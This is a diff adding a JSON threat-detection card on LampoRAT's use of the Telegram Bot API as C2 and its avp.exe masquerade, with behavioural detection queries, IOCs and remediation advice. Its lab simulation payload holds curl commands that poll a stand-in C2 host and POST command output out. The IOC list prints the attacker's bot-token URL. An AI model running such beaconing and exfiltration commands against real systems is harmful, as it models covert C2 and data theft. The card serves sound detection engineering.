@@ -1,0 +1,428 @@
+{
+  "id": "TTP-2026-0115",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-07-24T01:36:50+00:00",
+    "updated_at": "2026-07-24T01:36:50+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-ndr",
+      "vector-c2",
+      "vector-saas-c2-abuse",
+      "vector-behavioral-anomaly",
+      "protocol-https",
+      "actor-boggy-serpens",
+      "actor-muddywater",
+      "malware-lamporat",
+      "masquerade",
+      "abioc",
+      "analytics-behavioral-ioc",
+      "network",
+      "severity-high",
+      "unit42"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-PANW-TECHDOCS",
+      "SRC-UNIT42"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "network",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": false,
+      "platforms": [
+        "linux",
+        "network-fabric"
+      ],
+      "estimated_runtime_seconds": 420,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Telegram Bot API Abused as Allowlisted-SaaS C2 — LampoRAT (Boggy Serpens) — Cortex Network ABIOC (T1102.002 / T1036.005)",
+    "summary": "LampoRAT (Boggy Serpens / MuddyWater) rides the Telegram Bot API on api.telegram.org for C2 — a fully-allowlisted SaaS endpoint, so reputation and IOC matching are blind. Detection keys on a source workload polling the Bot API at a small periodic cadence its learned per-host SaaS baseline never contained, stitched to an avp.exe->cmd.exe masquerade dispatch on the same host.",
+    "description": "Boggy Serpens (Unit 42 name for MuddyWater, attributed to the Iranian MOIS) deployed LampoRAT — a Rust implant that masquerades on disk as avp.exe, the Kaspersky Anti-Virus process — against an energy and marine-services company in the Middle East across four campaigns from August 2025 through February 2026. LampoRAT's command-and-control does not use attacker-owned infrastructure at all: it embeds a hardcoded Telegram bot token (bot 8398566164, display name Olalampo, username stager_51_bot) and speaks the Telegram Bot API over HTTPS to api.telegram.org, polling the Bot API for operator commands and returning command output over the Bot API. (Unit 42 documents the hardcoded bot token and the /getMe profile lookup, and describes a dispatcher that receives commands and transmits results back to the operator's Telegram chat; the specific getUpdates/sendMessage request-response methods are the standard Bot API polling model this card models, not method names the source attributes to LampoRAT.) Because api.telegram.org is a globally trusted SaaS endpoint that virtually every enterprise allowlists, a reputation feed, a domain blocklist, or an IOC rule keyed on the destination all fail — the C2 traffic is indistinguishable from legitimate Telegram usage at the address level. The signal that survives lives in behaviour: a server workload role (a host whose learned Cortex SaaS-egress baseline never includes Telegram at all) begins a periodic, small, request-response poll to the Bot API, and on the same host a process named after a security vendor (avp.exe) spawns a command interpreter with LampoRAT's signature dispatcher argument string (cmd.exe /e:ON /v:OFF /d /c <payload>) to execute the operator's shell commands and internal RAT commands like /cd. Unit 42 also observed the dispatcher emitting user-friendly emoji status indicators (checkmark 'CD to', cross 'CD error:') and assessed that Boggy Serpens is using generative AI to accelerate variant creation — the emoji CLI affordance is a tell that LLM-generated bot code frequently ships by default. Cortex Network Security Analytics learns each host's SaaS-egress baseline (which SaaS destinations it talks to, at what cadence, with what payload profile) and PANW authors and continually auto-tunes Analytics Behavioral IOCs (ABIOCs) against that learned baseline, firing on a single suspicious flow that carries an identified chain of causality rather than on a known-bad indicator. This card exercises that detector class on the NDR plane against a fully-allowlisted SaaS C2. It injects two behavioral deviations: (a) a source workload begins the Bot API poll-and-exfil shape (modeled on the standard getUpdates/sendMessage request-response cadence) to api.telegram.org that its learned SaaS baseline never contained, and (b) an avp.exe masquerade (running outside the real Kaspersky install path) spawns cmd.exe with the /e:ON /v:OFF /d /c dispatcher string on that same host. Two ABIOCs cover the two deviation shapes; supporting validation XQL surfaces the Bot API poll shape from the NGFW traffic and the masquerade dispatcher from endpoint telemetry; a correlation rule stitches the two ABIOCs into a single LampoRAT Telegram-C2 incident anchored to the SaaS-egress-plus-masquerade causality chain — proof that Cortex's behavioral analytics catch C2 on an allowlisted SaaS channel where reputation and IOC matching are structurally blind.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Boggy Serpens",
+        "aliases": [
+          "MuddyWater",
+          "Mango Sandstorm",
+          "Static Kitten",
+          "TA450",
+          "Seedworm"
+        ],
+        "mitre_group_id": "G0069"
+      }
+    ],
+    "campaigns": [
+      "Boggy Serpens intrusion against a Middle East energy and marine-services company (four campaigns, August 2025 - February 2026)"
+    ],
+    "malware_families": [
+      {
+        "name": "LampoRAT"
+      }
+    ],
+    "industries_targeted": [
+      "energy-utilities",
+      "financial-services",
+      "transportation-logistics"
+    ],
+    "geographies_targeted": [
+      "Middle East",
+      "Israel",
+      "Turkey",
+      "Saudi Arabia",
+      "United Arab Emirates",
+      "Egypt"
+    ],
+    "first_observed": "2017-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1102",
+        "subtechnique_id": "T1102.002",
+        "name": "Web Service: Bidirectional Communication",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1573",
+        "subtechnique_id": "T1573.002",
+        "name": "Encrypted Channel: Asymmetric Cryptography",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1036",
+        "subtechnique_id": "T1036.005",
+        "name": "Masquerading: Match Legitimate Name or Location",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      }
+    ],
+    "kill_chain_phase": "command-and-control",
+    "data_sources": [
+      "Network Traffic: Network Connection Creation",
+      "Network Traffic: Network Traffic Flow",
+      "Network Traffic: Network Traffic Content",
+      "Process: Process Creation",
+      "Command: Command Execution"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-NDR-011 — Telegram Bot API abused as an allowlisted-SaaS C2 channel (LampoRAT / Boggy Serpens) for Cortex network ABIOC validation.",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "NGFW inline with Enhanced Application Logs (and TLS decryption where policy permits) forwarding into XSIAM so per-session SaaS egress telemetry reaches panw_ngfw_traffic_raw.",
+        "check_command": "ip route get 1.1.1.1"
+      },
+      {
+        "description": "A baseline window has elapsed during which the source workload produced only its normal SaaS egress so Cortex Network Security Analytics learned the host SaaS-egress profile (which never includes api.telegram.org).",
+        "check_command": "systemctl status cortex-agent || ls /opt/traps"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# No known-bad IOC and no real Telegram bot is contacted. Reproduce the LampoRAT\n# Telegram Bot API C2 request-response SHAPE against an authorised lab stand-in\n# host (default 127.0.0.1), then model the avp.exe->cmd.exe masquerade dispatch\n# on the lab host with a security-vendor-named binary spawning a command shell.\n# A synthetic bot token is used in the URI path so the poll/exfil shape matches\n# without ever reaching the real attacker bot.\nset -euo pipefail\nSIM_TOKEN=\"bot0000000000:SIM-LAMPORAT-TELEGRAM-SHAPE\"\n# (a) Bot API poll shape (standard getUpdates polling model): periodic small request-response poll for tasking\nfor i in $(seq 1 10); do curl -s --max-time 3 \"http://${C2_HOST:-127.0.0.1}/${SIM_TOKEN}/getUpdates?timeout=25&offset=${i}\" >/dev/null 2>&1 || true; sleep 3; done\n# (b) Bot API output shape (standard sendMessage model): small POST returning command output to the operator\ncurl -s --max-time 3 -X POST \"http://${C2_HOST:-127.0.0.1}/${SIM_TOKEN}/sendMessage\" --data 'chat_id=0&text=CD to /tmp' >/dev/null 2>&1 || true\n# (c) avp.exe->cmd.exe masquerade dispatch modelled on the lab host (non-destructive)\ncp /bin/sh /tmp/avp.exe 2>/dev/null || true\n/tmp/avp.exe -c 'echo \"cmd.exe /e:ON /v:OFF /d /c whoami\" > /tmp/.lamporat-dispatch.marker' 2>/dev/null || true",
+      "input_variables": [
+        {
+          "name": "C2_HOST",
+          "type": "string",
+          "default": "127.0.0.1",
+          "description": "Authorised lab stand-in host the Bot-API-shaped poll/exfil reaches. Never the real api.telegram.org bot during simulation."
+        }
+      ],
+      "timeout_seconds": 420
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "network-connection",
+        "description": "A source workload emitting a periodic, small request-response poll and a small output POST to the Bot API host that its learned SaaS-egress baseline never contained (modeled on the standard Bot API polling cadence).",
+        "expected_value": "app in (\"telegram-base\", \"ssl\") AND dst_host = \"api.telegram.org\" AND poll_sessions >= 6"
+      },
+      {
+        "artifact_type": "process",
+        "description": "A process named after a security vendor (avp.exe) running outside the real Kaspersky install path, spawning a command interpreter with the LampoRAT dispatcher argument string.",
+        "expected_value": "actor_process_image_name = \"avp.exe\" AND action_process_command_line contains \"/e:ON /v:OFF /d /c\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "rm -f /tmp/avp.exe /tmp/.lamporat-dispatch.marker; echo '[CortexSim] SIM-NDR-011 cleanup complete.'"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "file-sha256",
+        "value": "81a6e6416eb7ab6ce6367c6102c031e2ae2730c3c50ab9ce0b8668fec3487848",
+        "context": "LampoRAT sample (Rust implant, masquerades on disk as avp.exe, PDB path Char.pdb). Published by Unit 42 in the Boggy Serpens threat assessment.",
+        "reputation_required": "malicious"
+      },
+      {
+        "ioc_type": "url",
+        "value": "https://api.telegram.org/bot8398566164:AAEJbk6EOirZ_ybm4PJ-q8mOpr1RkZx1H7Q/",
+        "context": "LampoRAT hardcoded Telegram Bot API C2 endpoint (bot username stager_51_bot, display name Olalampo). The HOST api.telegram.org is a globally allowlisted SaaS endpoint — do NOT blocklist it; the discriminating indicator is the specific bot token in the URI path, and even that rotates per variant. This is exactly why the card's primary detection is behavioral (ABIOC on the poll/exfil shape) rather than IOC/reputation-based."
+      },
+      {
+        "ioc_type": "filename",
+        "value": "avp.exe",
+        "context": "On-disk name LampoRAT masquerades under (the legitimate Kaspersky Anti-Virus process name). Benign on its own — only anomalous when running OUTSIDE the real Kaspersky install path and spawning a command shell, which is the ABIOC/BIOC discriminator, not the filename alone."
+      }
+    ],
+    "biocs": [],
+    "abiocs": [
+      {
+        "name": "NDR-011 Telegram Bot API C2 Egress Deviating from Host SaaS Baseline",
+        "description": "A source workload whose learned Cortex SaaS-egress baseline never included this destination begins a periodic, small request-response poll to it — the LampoRAT Bot API poll/exfil C2 shape (modeled as the standard getUpdates/sendMessage request-response cadence; Unit 42 documents the dispatcher behavior, not the specific Bot API methods). The destination is discovered as new/rare by anti-joining src_ip against the host's learned per-host SaaS-destination baseline — it is NOT named in the query, so a globally allowlisted SaaS endpoint like api.telegram.org is caught the same way any never-before-seen SaaS destination would be; reputation and IOC matching are structurally blind. The ABIOC fires on the new-SaaS-destination-plus-poll-cadence deviation from the host's learned SaaS-egress baseline, anchored to the source workload causality chain rather than to a known-bad indicator.",
+        "logic": "dataset = panw_ngfw_traffic_raw\n| filter action = \"allow\"\n| filter app in (\"telegram-base\", \"ssl\", \"web-browsing-ssl\")\n| filter dst_host not in host_saas_baseline.egress_dsts[src_ip]\n| comp count() as poll_sessions, avg(bytes_received) as avg_resp_bytes, avg(bytes_sent) as avg_req_bytes by src_ip, dst_host\n| filter poll_sessions >= 6 and avg_resp_bytes < 4096 and avg_req_bytes < 2048\n| sort desc poll_sessions\n| fields src_ip, dst_host, poll_sessions, avg_resp_bytes, avg_req_bytes",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1102.002",
+          "T1071.001",
+          "T1573.002"
+        ],
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Learned per-host SaaS-egress baseline (the SaaS destinations a workload role normally reaches, and their cadence/payload profile) -> a new allowlisted-SaaS destination (api.telegram.org) contacted at a tight periodic poll cadence with small stable request/response payloads, anchored to the originating source workload."
+      },
+      {
+        "name": "NDR-011 avp.exe Masquerade Spawning Command Shell Stitched to Telegram C2",
+        "description": "On the same host that is polling the Bot API, a process named avp.exe (the Kaspersky Anti-Virus process name) runs OUTSIDE the real Kaspersky install path and spawns a command interpreter with LampoRAT's signature dispatcher argument string (cmd.exe /e:ON /v:OFF /d /c). Every name involved is legitimate, so a signature keyed on avp.exe or cmd.exe alone misfires; the ABIOC fires on the masquerade-plus-command-dispatch deviation from the host's learned process baseline, anchored to the masquerading parent and the concurrent Telegram C2 egress.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"avp.exe\"\n| filter actor_process_image_path not contains \"Kaspersky Lab\" and actor_process_signature_status != \"SIGNED\"\n| filter action_process_image_name = \"cmd.exe\"\n| filter action_process_command_line contains \"/e:ON\" and action_process_command_line contains \"/v:OFF\" and action_process_command_line contains \"/d /c\"\n| comp count() as dispatch_events by agent_hostname, actor_process_image_name, actor_process_image_path\n| filter dispatch_events >= 1\n| sort desc dispatch_events\n| fields agent_hostname, actor_process_image_name, actor_process_image_path, dispatch_events",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1036.005",
+          "T1059.003"
+        ],
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Masqueraded avp.exe (Kaspersky process name running outside the real Kaspersky install path, unsigned) -> spawns cmd.exe with the LampoRAT dispatcher string /e:ON /v:OFF /d /c -> same host concurrently beaconing to api.telegram.org, anchored to the masquerading parent process."
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "NDR-011 Telegram Bot API Poll and Exfil Shape Surfaced on Non-Baseline Workload",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter _time > to_timestamp(current_time() - 900)\n| filter action = \"allow\"\n| filter app in (\"telegram-base\", \"ssl\", \"web-browsing-ssl\")\n| filter dst_host = \"api.telegram.org\"\n| comp count() as poll_sessions, avg(bytes_received) as avg_resp_bytes by src_ip, dst_host\n| filter poll_sessions >= 6\n| sort desc poll_sessions\n| fields src_ip, dst_host, poll_sessions, avg_resp_bytes",
+        "expected_rows_min": 0,
+        "dataset": "panw_ngfw_traffic_raw"
+      },
+      {
+        "purpose": "validation",
+        "name": "NDR-011 avp.exe to cmd.exe Masquerade Dispatcher Surfaced",
+        "query": "dataset = xdr_data\n| filter _time > to_timestamp(current_time() - 900)\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"avp.exe\"\n| filter action_process_image_name = \"cmd.exe\"\n| filter action_process_command_line contains \"/d /c\"\n| comp count() as dispatch_events by agent_hostname, actor_process_image_path\n| filter dispatch_events >= 1\n| fields agent_hostname, actor_process_image_path, dispatch_events",
+        "expected_rows_min": 0,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "LampoRAT Telegram-Bot-API C2 on Allowlisted SaaS — ABIOC Causality Stitch",
+        "rule_id": "CR-NDR-0011",
+        "logic": "ABIOC(NDR-011 Telegram Bot API C2 Egress Deviating from Host SaaS Baseline) AND ABIOC(NDR-011 avp.exe Masquerade Spawning Command Shell Stitched to Telegram C2) — fuses the network Bot-API C2 egress deviation and the avp.exe->cmd.exe masquerade dispatch on the same agent_hostname/src_ip into a single LampoRAT Telegram-C2 incident anchored to the SaaS-egress-plus-masquerade causality chain, surviving the SaaS allowlist that defeats reputation and IOC matching."
+      }
+    ],
+    "analytics_modules": [
+      {
+        "module": "Cortex XSIAM Network Security Analytics — new/rare SaaS destination for source workload",
+        "validated": false,
+        "note": "Shape mapped by ABIOC 'NDR-011 Telegram Bot API C2 Egress Deviating from Host SaaS Baseline'. Not lab-validated: this card's non-destructive Linux simulation emits an HTTP poll to an authorised stand-in host (default 127.0.0.1), which does not land a real HTTPS session with SNI api.telegram.org in panw_ngfw_traffic_raw. Live firing requires real LampoRAT-shaped SaaS egress telemetry."
+      },
+      {
+        "module": "Cortex XSIAM Analytics — periodic small request-response poll cadence to a SaaS endpoint",
+        "validated": false,
+        "note": "Shape mapped by XQL 'NDR-011 Telegram Bot API Poll and Exfil Shape Surfaced on Non-Baseline Workload' (expected_rows_min 0 — shape-only). Live firing requires real Bot API HTTPS egress in panw_ngfw_traffic_raw; the lab stand-in poll does not produce it."
+      },
+      {
+        "module": "Cortex XSIAM Analytics — security-vendor process masquerade spawning a command interpreter",
+        "validated": false,
+        "note": "Shape mapped by ABIOC 'NDR-011 avp.exe Masquerade Spawning Command Shell Stitched to Telegram C2'. Not lab-validated: the Linux cp /bin/sh -> /tmp/avp.exe model cannot produce a Windows xdr_data PROCESS_START of avp.exe spawning cmd.exe with the /e:ON /v:OFF /d /c dispatcher string. Live firing requires a Windows target running the real avp.exe->cmd.exe process tree."
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xsiam",
+        "submodule": "network-security-analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-XSIAM-NDR-011-TELEGRAM-C2",
+          "TBD-XSIAM-NDR-011-AVP-MASQUERADE"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = panw_ngfw_traffic_raw | filter action = \"allow\" | filter dst_host = \"api.telegram.org\" | comp count() as poll_sessions, avg(bytes_received) as avg_resp_bytes by src_ip, dst_host | filter poll_sessions >= 6 and avg_resp_bytes < 4096"
+      },
+      {
+        "module": "cortex-xdr",
+        "submodule": "agent",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-XDR-NDR-011-AVP-CMD-MASQUERADE"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = xdr_data | filter actor_process_image_name = \"avp.exe\" | filter action_process_image_name = \"cmd.exe\" | filter action_process_command_line contains \"/d /c\" | fields agent_hostname, actor_process_image_path, action_process_command_line"
+      },
+      {
+        "module": "advanced-threat-prevention",
+        "submodule": "inline-cloud-analysis",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-ATP-NDR-011-C2"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = panw_ngfw_threat_raw | filter category = \"command-and-control\" | filter dst_host = \"api.telegram.org\" | comp count() as c2_hits by src_ip, dst_host, threat_name"
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-NDR-011",
+        "name": "Allowlisted-SaaS C2 Detection via Cortex Network ABIOC — Telegram Bot API (LampoRAT)",
+        "description": "Cortex's auto-tuned Network Analytics Behavioral IOCs learn a workload's SaaS-egress baseline and detect LampoRAT's Telegram Bot API C2 by the new-SaaS-destination poll/exfil shape and the concurrent avp.exe->cmd.exe masquerade dispatch, anchored to the host causality chain, where reputation and IOC matching are structurally blind because api.telegram.org is a globally allowlisted SaaS endpoint.",
+        "test_cases": [
+          {
+            "test_case_id": "TC-NDR-011A",
+            "objective": "Cortex learns the workload SaaS-egress baseline and the injected Telegram Bot API poll/exfil shape fires the network C2 ABIOC.",
+            "preconditions": [
+              "NGFW inline with EAL forwarding to XSIAM (panw_ngfw_traffic_raw populated).",
+              "Baseline window elapsed with the source workload producing only its normal SaaS egress (no Telegram)."
+            ],
+            "steps": [
+              "Let the host SaaS-egress baseline window elapse.",
+              "Emit the Bot API poll-and-exfil request-response shape (standard getUpdates/sendMessage cadence) to the Bot API host.",
+              "Observe ABIOC 'NDR-011 Telegram Bot API C2 Egress Deviating from Host SaaS Baseline' fire."
+            ],
+            "success_criteria": [
+              "ABIOC `NDR-011 Telegram Bot API C2 Egress Deviating from Host SaaS Baseline` fires when the new SaaS destination is absent from the host's learned SaaS-egress baseline.",
+              "Validation XQL `NDR-011 Telegram Bot API Poll and Exfil Shape Surfaced on Non-Baseline Workload` returns the poll/exfil shape rows when real Bot API HTTPS egress telemetry is present (shape-only in the non-destructive lab, where the stand-in poll does not populate panw_ngfw_traffic_raw).",
+              "No reputation or IOC rule on api.telegram.org is required for the detection to fire — the destination is discovered as new/rare by the baseline anti-join, not named in the query."
+            ],
+            "expected_score_weight": 0.5
+          },
+          {
+            "test_case_id": "TC-NDR-011B",
+            "objective": "The avp.exe->cmd.exe masquerade dispatch fires the endpoint ABIOC and the correlation stitches both deviations into one incident.",
+            "preconditions": [
+              "Cortex XDR agent installed on the same host (xdr_data populated).",
+              "TC-NDR-011A executed so the Telegram C2 ABIOC is present for stitching."
+            ],
+            "steps": [
+              "Run the avp.exe masquerade spawning cmd.exe with the /e:ON /v:OFF /d /c dispatcher string.",
+              "Observe the masquerade ABIOC fire.",
+              "Observe CR-NDR-0011 stitch the network and endpoint deviations into one LampoRAT Telegram-C2 incident."
+            ],
+            "success_criteria": [
+              "ABIOC `NDR-011 avp.exe Masquerade Spawning Command Shell Stitched to Telegram C2` fires.",
+              "Correlation `CR-NDR-0011` raises one stitched LampoRAT Telegram-C2 incident on the same host.",
+              "Validation XQL `NDR-011 avp.exe to cmd.exe Masquerade Dispatcher Surfaced` returns the dispatcher rows when a real Windows avp.exe->cmd.exe process tree is present (shape-only in the non-destructive Linux lab, which does not populate the Windows xdr_data process fields)."
+            ],
+            "expected_score_weight": 0.5
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Enforce App-ID least-privilege egress: server/workload roles should not be permitted to reach consumer SaaS such as Telegram (app 'telegram-base') at all — deny it in egress policy so the C2 channel is cut, not merely detected.",
+      "Require an authenticated egress proxy and TLS decryption on outbound HTTPS so the Bot API request-response shape is inspectable and Advanced Threat Prevention can apply inline cloud analysis to it.",
+      "Application-allowlist server workloads and block execution of security-vendor-named binaries (avp.exe) from any path other than the vendor's real install location; deny cmd.exe descendants for non-interactive service processes."
+    ],
+    "detection_engineering": [
+      "Let Cortex auto-tune network ABIOCs against the learned per-host SaaS-egress baseline rather than relying on reputation/IOC feeds — allowlisted-SaaS C2 (Telegram, Discord, Slack, cloud storage) defeats destination-based matching by design.",
+      "Baseline each workload's SaaS destinations, poll cadence and payload profile; alert on a new SaaS destination reached at a tight periodic small request-response cadence (the small periodic Bot-API poll/exfil cadence).",
+      "Alert on a security-vendor process name running outside its real install path and spawning a command interpreter, and correlate that masquerade with concurrent allowlisted-SaaS egress into one C2 incident."
+    ],
+    "response_playbook": "XSOAR-PB-AllowlistedSaaSC2Triage-v1"
+  },
+  "references": [
+    {
+      "title": "Unit 42 — Boggy Serpens (MuddyWater) Threat Assessment: LampoRAT and Telegram Bot API C2",
+      "url": "https://unit42.paloaltonetworks.com/boggy-serpens-threat-assessment/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1102.002 — Web Service: Bidirectional Communication",
+      "url": "https://attack.mitre.org/techniques/T1102/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1036.005 — Masquerading: Match Legitimate Name or Location",
+      "url": "https://attack.mitre.org/techniques/T1036/005/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "Cortex XSIAM — Network Security Analytics and Analytics BIOC (ABIOC) behavioral detection",
+      "url": "https://docs-cortex.paloaltonetworks.com/r/Cortex-XSIAM/Cortex-XSIAM-Analytics-Alert-Reference",
+      "publisher": "Palo Alto Networks TechDocs",
+      "publisher_id": "SRC-PANW-TECHDOCS"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-07-24",
+      "author": "Henry Reed",
+      "change": "Promoted from research-intake scaffold to active NDR network ABIOC card — Telegram Bot API abused as allowlisted-SaaS C2 (LampoRAT / Boggy Serpens): a network ABIOC on the Bot API poll/exfil shape deviating from the learned host SaaS-egress baseline, an endpoint ABIOC on the avp.exe->cmd.exe masquerade dispatch, stitched by CR-NDR-0011. Grounded in Unit 42 SRC-UNIT42 reporting. Backs scenario SIM-NDR-011."
+    }
+  ]
+}
